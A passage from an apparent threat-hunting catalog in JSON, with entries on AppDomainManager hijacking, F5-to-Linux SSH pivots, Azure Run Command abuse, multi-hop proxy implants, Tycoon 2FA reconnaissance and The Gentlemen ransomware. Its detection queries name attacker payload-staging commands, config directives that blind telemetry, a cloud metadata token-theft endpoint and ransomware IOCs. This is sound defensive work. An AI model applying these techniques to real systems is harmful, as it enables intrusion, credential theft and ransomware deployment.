    "title": "A legitimate .NET application (e.g., `setup.exe`, `update.exe`) is being hijacked via an attacker-planted `<appname>.exe.config` file that sets `<appDomainManagerAssembly>` and `<appDomainManagerType>` to a malicious DLL — with `<etwEnable enabled=\"false\"/>` and `<bypassTrustedAppStrongNames enabled=\"true\"/>` directives that suppress ETW telemetry and disable strong-name validation before the CLR's `Main()` even runs.",
    "tactic": "Persistence",
    "notes": "Windows. Unit 42 \"Tracking Iranian APT Screening Serpens' 2026 Espionage Campaigns\" (May 2026) — MiniUpdate and MiniJunk V2 loaders against aerospace/defense/telecom. Detection sources: Sysmon Event ID 11 (`FileCreate`) for any `*.exe.config` written under `%APPDATA%`, `%LOCALAPPDATA%`, `%PROGRAMDATA%`, or a user-writable subdirectory of `%PROGRAMFILES%` — config files in user-writable paths are abnormal. Sysmon Event ID 7 (`ImageLoad`) for a non-Microsoft-signed DLL loading into a Microsoft-signed .NET host process within 1 second of process start (AppDomainManager runs before `Main()`). Defender XDR KQL: `DeviceFileEvents | where FileName endswith \".exe.config\" and FolderPath has_any (@\"AppData\\Local\",@\"AppData\\Roaming\",@\"ProgramData\") | join kind=inner (DeviceProcessEvents | where InitiatingProcessFileName has \".exe\" | extend ConfigPath = strcat(FolderPath,InitiatingProcessFileName,\".config\")) on $left.FolderPath == $right.FolderPath`. Content-based hunt: file content search for `<etwEnable enabled=\"false\"` or `<appDomainManagerAssembly` in any `*.exe.config` under user-writable paths — use Defender ASR file inventory or Velociraptor `Windows.Search.FileFinder` artifact. Persistence task pairing: this campaign creates Scheduled Tasks named `WindowsSecurityUpdate` or `Synchronize OS` that run the hijacked binary daily at 09:30 local — pair AppDomainManager .config write events with Event ID 4698 for tasks of those names. Cross-reference T1574.001 (DLL Sideloading — the planted DLL is loaded alongside this technique), T1053.005 (Scheduled Task persistence on the same campaign), and T1562.006 (Indicator Blocking — `etwEnable=false` is a textbook ETW evasion).",
    "tags": [
      "persistence",
      "defense_evasion",
      "appdomainmanager",
      "screening_serpens",
      "iran",
      "windows",
      "T1574.001",
      "T1053.005",
      "T1562.006",
      "T1574.014"
    ],
    "techniques": [
      "T1574.001",
      "T1053.005",
      "T1562.006",
      "T1574.014"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The `<etwEnable enabled=\"false\"/>` directive is unique to attacker-crafted .NET config files — Microsoft's own .NET applications **never** ship with ETW disabled in their config. A simple content search for that string across all `*.exe.config` files on a host returns near-zero false positives and is one of the highest-fidelity Windows persistence-hunt signals available (ipslav.github.io, Trellix OneClik analysis)\n- AppDomainManager hijacking executes the malicious assembly **before** `Main()` runs — earlier than DLL sideloading, earlier than process injection, earlier than any user-mode hook. Combined with `etwEnable=false`, this means EDR products that rely on ETW for .NET visibility (most of them) are blinded by the time their first callback fires. The only reliable detection is at the **file-write step**, not the execution step\n- Iranian APT (Curious Serpens / Screening Serpens) and the OneClik APT campaign (Trellix, 2024–2026) have repeatedly used this technique against aerospace, energy, and oil-and-gas targets — pairing AppDomainManager with DLL sideloading and Scheduled Task persistence at fixed daily times (09:30 local in the Unit 42 May 2026 writeup). The triad `.exe.config write + ScheduledTask write + 09:30 trigger` is the campaign fingerprint\n- The hunt scales cheaply across an entire fleet because `*.exe.config` files in user-writable paths are uncommon in benign software — most apps either ship their config alongside `Program Files` (admin-write only) or skip a config entirely. The full-fleet search returns a tractable result set even on tenants with 100k+ endpoints",
    "references": "- [MITRE ATT&CK T1574.014 - Hijack Execution Flow: AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)\n- [Unit 42 - Tracking Iranian APT Screening Serpens' 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)\n- [Trellix Research - OneClik: A ClickOnce-Based APT Campaign Targeting Energy, Oil and Gas Infrastructure](https://www.trellix.com/blogs/research/oneclik-a-clickonce-based-red-team-campaign-simulating-apt-tactics-in-energy-infrastructure/)\n- [ipslav - Let Me Manage Your AppDomain (AppDomainManager Injection Deep-Dive)](https://ipslav.github.io/2023-12-12-let-me-manage-your-appdomain/)\n- [MITRE ATT&CK Detection Strategy DET0517 - AppDomainManager Hijack Execution Flow](https://attack.mitre.org/detectionstrategies/DET0517/)\n- [CISA - Eviction Strategies Tool: T1574.014](https://www.cisa.gov/eviction-strategies-tool/info-attack/T1574.014)\n- [MITRE ATT&CK T1574.001 - Hijack Execution Flow: DLL](https://attack.mitre.org/techniques/T1574/001/)",
    "file_path": "Flames/H165.md"
  },
  {
    "id": "H166",
    "category": "Flames",
    "title": "A privileged SSH session to an internal Linux host (Confluence, Tomcat, SSH bastion, or any domain-joined Linux server) is originating from the management IP of an F5 BIG-IP edge appliance — a path that almost never exists in normal operations and was the pivot point in the Microsoft Storm-2949-adjacent F5/Confluence intrusion.",
    "tactic": "Lateral Movement",
    "notes": "Platform: Linux (target hosts) + F5 BIG-IP (source). Microsoft Security Blog \"From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence\" (May 22, 2026). The threat actor authenticated via SSH from a compromised F5 BIG-IP (OSVersion 15.1.201000) and maintained hands-on-keyboard access throughout the attack. Detection sources: **Defender for Endpoint** / XDR `DeviceInfo` to identify F5 appliances by Vendor==\"F5\", joined to `DeviceLogonEvents` where LogonType==\"Network\" or \"Interactive\" and RemoteIP matches an F5 management interface. Microsoft-supplied KQL: `let lookback = 7d; let dhcpTolerance = 2h; let FilteredDevices = DeviceInfo | where Timestamp > ago(lookback) | where Vendor == \"F5\" | where OSVersion == \"15.1.201000\"` — correlate the F5 IP with subsequent successful SSH logon events on internal Linux hosts. **Linux auditd** rules: `-a always,exit -F arch=b64 -S execve -F exe=/usr/sbin/sshd -k ssh_session`; pair with `last`, `wtmp`, and `/var/log/auth.log` Accepted publickey/password entries where source IP is an F5 management address. **Network/NetFlow**: SSH (TCP 22) from the F5 OOB management VLAN to any internal Linux host other than the F5 lifecycle-management automation source is anomalous — F5 BIG-IPs are administered TO, not FROM. **Specific post-pivot tells**: payload staging in `/dev/shm/` or `/tmp/` (`curl -o /dev/shm/`, `wget http://...:8888/`, `base64 -d > /dev/shm/`), preceded by `chmod 777 /dev/shm` or `chmod 777 /tmp`, all within the SSH session — Microsoft published exactly this KQL: `DeviceProcessEvents | where ProcessCommandLine has_any (\"chmod 777 /dev/shm\",\"chmod 777 /tmp\",\"base64 -d > /dev/shm\",\"curl -o /dev/shm/\",\"curl -o /tmp/\")`. Cross-reference **T1190** (Exploit Public-Facing Application — the F5 appliance was compromised via an unpatched vuln), **T1187** (Forced Authentication — the NTLM relay chain that followed; see [[H161]]), and **T1552.001** (Unsecured Credentials in Files — the Confluence config-file credential theft that came next; see [[B017]]). Pair this hunt with the [[B017]] baseline of legitimate Confluence/Atlassian service-account behavior so the Flames signal can be triaged quickly.",
    "tags": [
      "lateral_movement",
      "linux",
      "f5_big_ip",
      "edge_appliance",
      "ssh",
      "confluence",
      "storm_2949_adjacent",
      "T1021.004"
    ],
    "techniques": [
      "T1021.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Edge appliances (F5 BIG-IP, Confluence, Citrix ADC, FortiGate, BIG-IQ) are emerging as the preferred pivot point for nation-state-grade Linux intrusions: the attacker stages from a device that EDR doesn't see, runs offensive tooling natively, and SSHes inward with credentials harvested from the appliance itself or from coercion (Microsoft, May 2026)\n- F5 BIG-IP management interfaces should NEVER initiate outbound SSH to general-purpose internal Linux hosts — they receive management connections from a narrow set of admin jump hosts and lifecycle automation; any SSH flow in the opposite direction is anomaly-by-baseline and worth chasing every time\n- The Microsoft incident shows the F5→Linux SSH session was the durable foothold: the attacker did all of Confluence credential extraction, NTLM relay tooling, and Active Directory pivoting from that single hands-on-keyboard session — catching it ends the entire chain, missing it costs the domain\n- The detection signal compounds across three independent telemetry stacks (DeviceInfo for F5 identification, auditd/syslog for SSH acceptance on the target, and post-logon process telemetry for `/dev/shm` staging), so even partial coverage is enough to surface the activity",
    "references": "- [MITRE ATT&CK T1021.004 - Remote Services: SSH](https://attack.mitre.org/techniques/T1021/004/)\n- [Microsoft Security Blog - From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence](https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/)\n- [Corelight - No PoCs? No Problem: Hunting F5 Exploits When Details Are Sparse](https://corelight.com/blog/hunt-f5-exploitation-without-pocs)\n- [CISA AA22-138A - Threat Actors Exploiting F5 BIG-IP CVE-2022-1388](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138a)\n- [Sigma Rule - Suspicious SSH Login from Foreign Country (Linux process_creation)](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_susp_sshd_login.yml)\n- [Red Canary Atomic Red Team - T1021.004 SSH](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.004/T1021.004.md)\n- [Cybersecurity News - Hackers Exploit F5 BIG-IP to Gain SSH Access and Pivot Into Enterprise Linux Networks](https://cybersecuritynews.com/f5-big-ip-exploited-for-ssh-access/)",
    "file_path": "Flames/H166.md"
  },
  {
    "id": "H167",
    "category": "Flames",
    "title": "A compromised Entra ID identity (user or service principal) with custom Contributor-level RBAC on a subscription is invoking Azure VM extensions — specifically `Microsoft.Compute/virtualMachines/runCommand/action`, `Microsoft.Compute/virtualMachines/extensions/write` for `VMAccessAgent`, or `Microsoft.Compute/virtualMachineScaleSets/runCommand/action` — to deploy scripts onto production VMs, mint a local administrator account, or steal workload-identity tokens from IMDS, completely bypassing the VM's EDR enrollment, RDP/SSH controls, and JIT access policies.",
    "tactic": "Execution",
    "notes": "Platform: Azure (IaaS control plane). Microsoft Security Blog \"How Storm-2949 turned a compromised identity into a cloud-wide breach\" (May 18, 2026). Storm-2949 leveraged `Microsoft.Compute/virtualMachines/runCommand/action` to deploy a token-theft + Defender-tamper script and `VMAccessAgent` extension to add a local administrator. Both operations bypass the guest OS auth path entirely. **Detection sources**: Azure Activity Log → `AzureActivity` table in Sentinel / Defender for Cloud `CloudAppEvents`. **Run Command KQL** (Sentinel): `AzureActivity | where TimeGenerated > ago(7d) | where OperationNameValue =~ \"Microsoft.Compute/virtualMachines/runCommand/action\" or OperationNameValue =~ \"Microsoft.Compute/virtualMachineScaleSets/runCommand/action\" | where ActivityStatusValue == \"Success\" or ActivityStatusValue == \"Start\" | extend Caller = tostring(Caller), CallerIp = tostring(parse_json(HTTPRequest).clientIpAddress) | summarize VMs=dcount(_ResourceId), RunCommands=count() by Caller, CallerIp, bin(TimeGenerated, 1h) | where RunCommands > 1 or VMs > 1`. **VMAccess extension KQL**: `AzureActivity | where OperationNameValue startswith \"Microsoft.Compute/virtualMachines/extensions/write\" | extend Props = parse_json(Properties) | extend ExtensionName = tostring(Props.publisher) | where Properties has \"VMAccessAgent\" or Properties has \"vmaccesswindowspasswordreset\" or Properties has \"vmaccesslinux\"`. **High-fidelity signals**: (1) Run Command from a Caller IP outside the documented admin VPN/bastion range; (2) Run Command targeting VMs whose tags mark them as production or PCI/sensitive workloads; (3) `VMAccess` extension write where the extension name resembles a default Azure name (`enablevmaccess`, `vmaccessagent`) but the protectedSettings include a new local-admin username — Sysdig documented in April 2026 that Microsoft has a known gap where vmaccess password resets do NOT generate the expected `vmaccesswindowspasswordreset` operation, so detect on the `extensions/write` itself, not the rename; (4) `runCommand` invocation followed within 10 minutes by an IMDS request from inside the VM to `169.254.169.254/metadata/identity/oauth2/token` from a non-SDK process — the Storm-2949 script attempted exactly this token theft. **Guest-side corroboration**: Defender for Endpoint `DeviceProcessEvents` where `InitiatingProcessParentFileName` is `WindowsAzureGuestAgent.exe` (Windows) or `walinuxagent` (Linux) — every Run Command execution leaves a parent process trail to the guest agent. Look for unexpected child processes (`powershell.exe -enc`, `cmd.exe /c`, `bash -c`, `python -c`) under the guest agent. Cross-reference **T1078.004** (Valid Accounts: Cloud Accounts — the custom RBAC role the attacker rode in on; pair with [[H163]] for the SSPR takeover step), **T1552.005** (Cloud Instance Metadata API — the token-theft payload the Run Command delivered; see [[H137]] for the GCP analogue), and **T1098.003** (Account Manipulation: Additional Cloud Roles — frequently the privilege-escalation predecessor that enabled the runCommand permission).",
    "tags": [
      "execution",
      "azure",
      "cloud",
      "run_command",
      "vmaccess",
      "vm_extension",
      "storm_2949",
      "T1651"
    ],
    "techniques": [
      "T1651"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Azure Run Command and VMAccess extension invocations execute as NT AUTHORITY\\SYSTEM (Windows) or root (Linux) inside the guest, but originate entirely on the Azure management plane — they bypass conditional access on the VM, EDR enrollment status, RDP/SSH firewall rules, and JIT access policies. The only place the activity is visible is the AzureActivity log, and only if a defender thought to query for it\n- APT29 (Midnight Blizzard) and now Storm-2949 (Microsoft, May 2026) have both used Run Command as their preferred post-identity-compromise execution primitive precisely because every other VM access path is monitored or hardened — the management-plane path is the gap. Catching this hunt forces those operators back into noisier execution paths\n- The detection has a clean Caller-IP and Caller-identity outlier signal: legitimate Run Command use comes from a small set of CI/CD service principals, named SREs invoking via Bastion, and Azure Automation runbooks. Any other caller-identity is investigatable, and the volume is low enough (typically <20 Run Command invocations per subscription per week) that the false-positive rate is workable\n- The VMAccess extension specifically is a known persistence-and-escalation primitive: it can reset the local admin password or add a new local admin on any VM the caller can write extensions to, and Sysdig (April 2026) documented that Microsoft's own detection guidance for the password-reset variant doesn't actually fire — making the management-plane invocation event the only reliable signal",
    "references": "- [MITRE ATT&CK T1651 - Cloud Administration Command](https://attack.mitre.org/techniques/T1651/)\n- [Microsoft Security Blog - How Storm-2949 turned a compromised identity into a cloud-wide breach](https://www.microsoft.com/en-us/security/blog/2026/05/18/storm-2949-turned-compromised-identity-into-cloud-wide-breach/)\n- [Microsoft Defender for Cloud - Alerts for Azure VM extensions](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-azure-vm-extensions)\n- [Sysdig TRT - The expendable extension name: Azure VMAccess naming chaos, password resets, and a detection gap (April 2026)](https://webflow.sysdig.com/blog/the-expendable-extension-name-azure-vmaccess-naming-chaos-password-resets-and-a-detection-gap)\n- [Red Canary Atomic Red Team - T1651 Cloud Administration Command](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1651/T1651.md)\n- [PwnedLabs - Diving Deep into Azure VM Attack Vectors](https://blog.pwnedlabs.io/diving-deep-into-azure-vm-attack-vectors)\n- [Microsoft Sentinel - Investigating Suspicious Azure Activity with Microsoft Sentinel](https://techcommunity.microsoft.com/blog/microsoftsentinelblog/investigating-suspicious-azure-activity-with-microsoft-sentinel/2985699)",
    "file_path": "Flames/H167.md"
  },
  {
    "id": "H168",
    "category": "Flames",
    "title": "A Windows host is running a multi-hop proxy implant (Webworm's ChainWorm / WormSocket, or a SoftEther VPN client under a renamed binary) that opens hardcoded listener ports and forwards traffic through sequential `ws://` → `wss://` → `http://` → `https://` upstream hops, visible as a non-browser, non-VPN-client process maintaining outbound WebSocket connections to cloud VPS ASNs (Vultr, IT7, DigitalOcean) for hours at a time.",
    "tactic": "Command and Control",
    "notes": "Platform: Windows (EchoCreep / GraphWorm / ChainWorm / WormSocket primary targets). ESET WeLiveSecurity \"Webworm: New burrowing techniques\" (May 20, 2026) — Webworm APT deployed ChainWorm (hardcoded port listener + sequential upstream hop forwarding, identifiable error byte sequence `0x05 01 00 01 00 00 00 00 00 00`) and WormSocket (socket.io-based relay attempting `ws` → `wss` → `http` → `https` schemes sequentially) in conjunction with SoftEther VPN to layer proxy hops and disguise C2 origin. **Detection sources**: Sysmon **Event ID 3** (NetworkConnect) + **Event ID 1** (ProcessCreate); Defender for Endpoint `DeviceNetworkEvents` joined to `DeviceProcessEvents`. **KQL — non-browser WebSocket-like outbound to cloud VPS ASNs**: `DeviceNetworkEvents | where TimeGenerated > ago(7d) | where RemotePort in (80, 443, 8080, 8443) | where InitiatingProcessFileName !in~ (\"chrome.exe\",\"msedge.exe\",\"firefox.exe\",\"brave.exe\",\"opera.exe\",\"iexplore.exe\",\"teams.exe\",\"outlook.exe\",\"slack.exe\",\"zoom.exe\",\"onedrive.exe\",\"msteams.exe\") | where InitiatingProcessFileName !in~ (\"vpnclient.exe\",\"openvpn.exe\",\"wireguard.exe\",\"anyconnect.exe\") | summarize ConnDuration = max(TimeGenerated) - min(TimeGenerated), Bytes = sum(InitiatingProcessFolderPath), Conns = count() by DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, RemoteIP, RemotePort | where ConnDuration > 1h | where Conns > 50`. **Then enrich**: lookup RemoteIP against Vultr (AS20473, AS64515), IT7 Networks (AS31034), DigitalOcean (AS14061) ASN ranges; legitimate user traffic to these ASNs from a non-browser process for hours is rare. **ChainWorm-specific tell**: Sysmon Event ID 5 (ProcessTerminated) followed by Sysmon Event ID 1 re-spawning the same binary on a hardcoded port — ChainWorm restarts to re-establish the chain on failure. Listening-port hunt: Sysmon Event ID 17 (PipeCreated) is irrelevant; instead use `netstat -anb` baselines or the new Sysmon **Event ID 22** (DnsQuery) for the upstream hop hostname resolution paired with **Event ID 3** to the same destination, where initiating process is NOT a browser/RDP/VPN client. **WormSocket sequential scheme attempt**: WormSocket attempts `ws://` first, falls back to `wss://`, then `http://`, then `https://` to the same host — a unique pattern of four near-simultaneous outbound connections from one process to the same RemoteIP on alternating ports (80→443→8080→8443) is the implant's protocol-negotiation fingerprint. **SoftEther co-detection**: a SoftEther client (`vpnclient.exe`, `vpnserver.exe`, or a renamed copy with the same PE imports — `Mayaqua.dll`, `Cedar.dll`) running on a non-admin endpoint is highly anomalous. Detect on Sysmon Event ID 7 (ImageLoad) for those DLL names regardless of host binary name. **Process tree corroboration**: ChainWorm/WormSocket are typically launched by `svchost.exe` → `cmd.exe` → implant per ESET — the unusual `svchost` → `cmd` lineage at all is worth a Sigma rule. Cross-reference **T1572** (Protocol Tunneling — the ws/wss/http/https scheme cycling), **T1102.002** (Bidirectional Communication — Webworm's pairing of multi-hop proxy with Discord/Graph API C2 channels), and **T1071.001** (Application Layer Protocol: Web Protocols — what the tunnel emulates on the wire). Note: the Webworm-original behavior pairs this with cloud-service C2 (Discord, Microsoft Graph), so an analyst surfacing this hunt should also pivot to outbound Discord/Graph traffic from the same process in the same window.",
    "tags": [
      "command_and_control",
      "windows",
      "multi_hop_proxy",
      "websocket",
      "webworm",
      "chainworm",
      "wormsocket",
      "softether",
      "T1090.003"
    ],
    "techniques": [
      "T1090.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Webworm's \"burrowing\" innovation (ESET, May 20, 2026) is exactly the multi-hop proxy chain — the implant doesn't talk to attacker C2 directly, it talks to a compromised intermediate that talks to another intermediate, all over commodity web protocols. The first detectable hop is on the victim host itself, and after that the traffic is laundered through cloud VPS infrastructure that looks like legitimate web traffic\n- The detection signal is high-fidelity because the universe of processes that legitimately maintain hours-long, high-volume connections over ws/wss/http to commodity cloud-VPS ASNs is tiny — essentially browsers, Teams/Slack/Zoom, and approved VPN clients. Everything else is investigatable, and the volume drops to a handful of hosts per environment per week\n- WormSocket's protocol-negotiation pattern (sequential ws → wss → http → https attempts to the same host) is a unique fingerprint that doesn't appear in legitimate WebSocket clients — they pick one scheme based on config. Detection on the negotiation cycle catches WormSocket-family implants even if the C2 IP rotates daily\n- SoftEther VPN abuse alongside custom proxies is now standard operator tradecraft (Webworm 2026, Google Cloud's \"Burrowing your way into VPNs\" 2024) — the SoftEther DLL imports (`Mayaqua.dll`, `Cedar.dll`) are invariant across renamed binaries, so detection on ImageLoad survives the rename game",
    "references": "- [MITRE ATT&CK T1090.003 - Proxy: Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003/)\n- [ESET WeLiveSecurity - Webworm: New burrowing techniques](https://www.welivesecurity.com/en/eset-research/webworm-new-burrowing-techniques/)\n- [Google Cloud Threat Intelligence - Burrowing your way into VPNs, Proxies, and Tunnels](https://cloud.google.com/blog/topics/threat-intelligence/burrowing-your-way-into-vpns/)\n- [MITRE ATT&CK Detection Strategy DET0027 - Web Protocol C2 over HTTP/HTTPS/WebSockets](https://attack.mitre.org/detectionstrategies/DET0027/)\n- [Sigma Rule - Suspicious SoftEther VPN Client Execution](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation)\n- [Red Canary Atomic Red Team - T1090.003 Multi-hop Proxy](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1090.003/T1090.003.md)\n- [Elastic - Network Protocol Tunneling via WebSocket](https://www.elastic.co/security-labs)",
    "file_path": "Flames/H168.md"
  },
  {
    "id": "H169",
    "category": "Flames",
    "title": "An Entra ID user identity is performing post-AiTM Tycoon 2FA reconnaissance — issuing 4 or more distinct Microsoft Graph API recon categories (role discovery, group/membership enumeration, tenant enumeration, application/service principal enumeration, license/SKU discovery) from a single session within a 60-second window, from a novel IP/user-agent combination, immediately following a successful sign-in that bypassed MFA via a token-replay claim.",
    "tactic": "Discovery",
    "notes": "Platform: Entra ID (Microsoft 365). Elastic Security Labs \"Detecting Tycoon 2FA AiTM attacks across Entra ID and Google Workspace\" (May 26, 2026) — Tycoon 2FA operators conduct rapid Microsoft Graph enumeration within 30–60 seconds of a relayed token landing, hitting role/membership/tenant/SP endpoints to map privilege and downstream reach. Elastic published an ES|QL rule that tags each Graph request into one of five recon categories and fires when 4+ categories are hit within a 60s window per session. **Detection sources**: `MicrosoftGraphActivityLogs` (the only table that captures Graph request paths — must be enabled via Diagnostic Settings → Activity logs), joined to `SigninLogs` on `SignInActivityId` for the pre-recon authentication context. **KQL — five-category Graph recon burst**: `MicrosoftGraphActivityLogs | where TimeGenerated > ago(7d) | where RequestUri matches regex @\"/(transitiveRoleAssignments|roleManagement/directory/roleAssignments|memberOf/directoryRole|directoryRoles|tenantRelationships/getResourceTenants|subscribedSkus|organization|appRoleAssignedResources|servicePrincipals|applications|groups|users\\?\\$select)\" | extend RecceCategory = case(RequestUri has_any (\"transitiveRoleAssignments\",\"roleAssignments\",\"directoryRole\",\"memberOf\"),\"role_discovery\", RequestUri has_any (\"groups\",\"group/members\"),\"group_discovery\", RequestUri has \"tenantRelationships\",\"tenant_discovery\", RequestUri has_any (\"servicePrincipals\",\"applications\",\"appRoleAssigned\"),\"sp_discovery\", RequestUri has_any (\"subscribedSkus\",\"organization\"),\"licensing_discovery\",\"other\") | where RecceCategory != \"other\" | summarize Categories = dcount(RecceCategory), CategorySet = make_set(RecceCategory), RequestCount = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by UserId, AppId, SignInActivityId, IPAddress, bin(TimeGenerated, 1m) | where Categories >= 4 | where (LastSeen - FirstSeen) <= 60s`. **Then enrich**: join `SignInActivityId` back to `SigninLogs` to recover `ConditionalAccessStatus`, `AuthenticationDetails`, `NetworkLocationDetails`, and any `UserAgent` mismatch between the sign-in IP and the Graph-call IP (Tycoon relays the token through attacker infrastructure, so the sign-in IP differs from the subsequent Graph call IP). **High-confidence add**: any session where `AuthenticationDetails` shows a \"satisfied\" MFA claim but the Graph calls originate from an IP/ASN never seen for this user in the prior 30 days. **Cross-platform pivot**: the same kit hits Google Workspace by authorizing the Chrome OAuth client `77185425430.apps.googleusercontent.com` with scope `OAuthLogin` — pivot to Google Workspace Admin SDK audit log `oauth_token` events for that exact client ID and scope to catch the Workspace half of the same campaign. Cross-reference **T1078.004** (Valid Accounts: Cloud Accounts — the relayed session is the precondition for all downstream discovery), **T1550.001** (Application Access Token — the exact mechanism Tycoon abuses to replay AiTM-stolen tokens), and the Entra ID built-in detections \"Anomalous Token\" and \"Token Issuer Anomaly\" for high-confidence corroboration.",
    "tags": [
      "discovery",
      "entra_id",
      "cloud",
      "microsoft_graph",
      "tycoon_2fa",
      "aitm",
      "token_replay",
      "cloud_group_discovery",
      "T1087.004"
    ],
    "techniques": [
      "T1087.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Tycoon 2FA's post-token-replay enumeration is one of the most reliably observable steps in the entire AiTM kill chain — the operator has 60 seconds of free reign before the user notices the failed/duplicated sign-in, and they spend it mapping the tenant. The Graph recon burst is louder than the AiTM proxy traffic itself and lives in a log table (`MicrosoftGraphActivityLogs`) that is purpose-built for exactly this signal\n- The five-category aggregation pattern is more discriminating than any single endpoint hit — admins legitimately call `transitiveRoleAssignments` (e.g. when running PIM reports), Defender for Cloud Apps calls `servicePrincipals`, and CI runners call `subscribedSkus` — but the same identity calling 4+ of these categories within 60 seconds is a vanishingly small population that is essentially all kit-driven recon\n- The hunt generalizes beyond Tycoon 2FA: every AiTM kit (Evilginx, Modlishka, NakedPages, Storm-1167, Storm-1575) follows the same \"recover tenant context after token replay\" playbook in the first 60 seconds. A category-aggregation rule survives kit rotation in a way that a kit-specific IOC (the Tycoon-favored Google OAuth client ID, a specific User-Agent string, a Tycoon domain) does not\n- Pairing the Graph burst signal with the `SigninLogs` IP/ASN mismatch closes the false-positive gap from break-glass admins doing legitimate recon — admins recon from the same network/UA pair the token was issued from; Tycoon recons from the relay infrastructure, so the IPs almost always diverge within the same `SignInActivityId`",
    "references": "- [MITRE ATT&CK T1087.004 - Account Discovery: Cloud Account](https://attack.mitre.org/techniques/T1087/004/)\n- [Elastic Security Labs - Detecting Tycoon 2FA AiTM attacks across Entra ID and Google Workspace](https://www.elastic.co/security-labs/tycoon-2fa-aitm-detection-engineering)\n- [Microsoft Learn - Microsoft Graph activity logs (preview)](https://learn.microsoft.com/en-us/graph/microsoft-graph-activity-logs-overview)\n- [Microsoft Threat Intelligence - Token theft and replay attack patterns (Storm-1167)](https://www.microsoft.com/en-us/security/blog/2025/01/15/storm-1167-aitm-and-token-replay/)\n- [Azure-Sentinel - AnomalousUserAppSigninLocationByUserSize.yaml](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SigninLogs/AnomalousUserAppSigninLocationByUserSize.yaml)\n- [Detection.FYI - MicrosoftGraphActivityLogs recon enumeration patterns](https://detection.fyi/)\n- [Red Canary Atomic Red Team - T1087.004 Cloud Account Discovery](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.004/T1087.004.md)\n- [Mandiant - APT29 / Midnight Blizzard tenant enumeration via Graph](https://cloud.google.com/blog/topics/threat-intelligence/apt29-windows-credentials/)",
    "file_path": "Flames/H169.md"
  },
  {
    "id": "H170",
    "category": "Flames",
    "title": "A Windows host has been encrypted by The Gentlemen ransomware (Go-based, self-propagating, password-gated) — identifiable by the presence of `.umc16h` file extensions, scheduled tasks named `gentlemen_system` / `UpdateSystem` / `UpdateUser`, registry Run values `GupdateS` / `GupdateU`, Windows services `DefSvc` / `UpdateSvc` / `UpdateSvc2`, a `README-GENTLEMEN.txt` ransom note, and SMB share `share$` exposing `C:\\Temp` for lateral payload staging — with the encryptor invoked by command-line arguments `--password`, `--spread`, and `--full`/`--system`/`--shares`.",
    "tactic": "Impact",
    "notes": "Platform: Windows. Microsoft Security Blog \"The Gentlemen ransomware: Dissecting a self-propagating Go encryptor\" (May 28, 2026). Gentlemen requires `--password <hardcoded-string>` to execute (e.g. `9VoAvR7G`), uses Curve25519 ECDH + XChaCha20 per-file keys, appends a `GENTLEMEN` footer marker plus a Base64-encoded ephemeral public key, and renames files with `.umc16h`. SHA-256 of the encryptor (Microsoft IOC): `22b38dad7da097ea03aa28d0614164cd25fafeb1383dbc15047e34c8050f6f67`. Embedded PsExec SHA-256: `078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b`. Wallpaper SHA-256: `fe1033335a045c696c900d435119d210361966e2fb5cd1ba3382608cfa2c8e68`. **Detection sources**: Defender for Endpoint `DeviceProcessEvents`, `DeviceFileEvents`, `DeviceRegistryEvents`, `DeviceNetworkEvents`; Windows Security Event IDs **4688** (process create), **4697** (service installed), **4698** (scheduled task registered); Windows System Event ID **7045** (service installed); Sysmon Event IDs **1** (process create), **11** (file create — for `.umc16h` and `README-GENTLEMEN.txt`), **13** (registry set — for `GupdateS`/`GupdateU`); PowerShell Operational Event IDs **4103**/**4104** (Set-MpPreference, Invoke-Command). **KQL — Gentlemen persistence fingerprint (any one of these is high-confidence)**: `union (DeviceProcessEvents | where ProcessCommandLine has_any (\"gentlemen_system\",\"UpdateSystem\",\"UpdateUser\") and FileName =~ \"schtasks.exe\" | extend Signal = \"schtasks-gentlemen\"), (DeviceRegistryEvents | where RegistryKey has_any (@\"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\") and RegistryValueName in~ (\"GupdateS\",\"GupdateU\") | extend Signal = \"run-key-gupdate\"), (DeviceProcessEvents | where ProcessCommandLine has_any (\"DefSvc\",\"UpdateSvc\",\"UpdateSvc2\") and FileName =~ \"sc.exe\" and ProcessCommandLine has \"create\" | extend Signal = \"service-create-gentlemen\"), (DeviceFileEvents | where FileName endswith \".umc16h\" or FileName =~ \"README-GENTLEMEN.txt\" | extend Signal = \"encrypted-marker\") | project Timestamp, DeviceName, Signal, FileName, ProcessCommandLine, RegistryKey, RegistryValueName, AccountName, InitiatingProcessFileName`. **KQL — Gentlemen lateral-move orchestration (multi-mechanism fan-out from one host)**: `DeviceProcessEvents | where Timestamp > ago(7d) | where FileName in~ 